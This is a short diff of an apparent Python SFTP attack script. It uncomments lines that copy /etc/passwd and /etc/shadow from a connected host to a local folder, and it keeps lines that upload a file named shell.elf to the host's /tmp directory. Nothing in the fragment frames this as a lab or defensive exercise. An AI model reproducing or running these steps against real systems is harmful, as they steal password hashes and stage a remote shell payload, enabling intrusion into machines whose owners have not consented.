@@ -55,17 +55,16 @@ try:
    
    sftp = client.open_sftp()
    
-# Download   
+   # Download   
+   filepath = "/etc/passwd"
+   localpath = "/home/user/passwd.txt"
+   sftp.get(filepath,localpath)
    
-   #filepath = "/etc/passwd"
-   #localpath = "/home/user/passwd.txt"
-   #sftp.get(filepath,localpath)
-   
-   #filepath = "/etc/shadow"
-   #localpath = "/home/user/shadow.txt"
-   #sftp.get(filepath,localpath)
+   filepath = "/etc/shadow"
+   localpath = "/home/user/shadow.txt"
+   sftp.get(filepath,localpath)
 
-# Upload
+   # Upload
    filepath = "/tmp/shell.elf"
    localpath = "shell.elf"
    sftp.put(localpath,filepath)
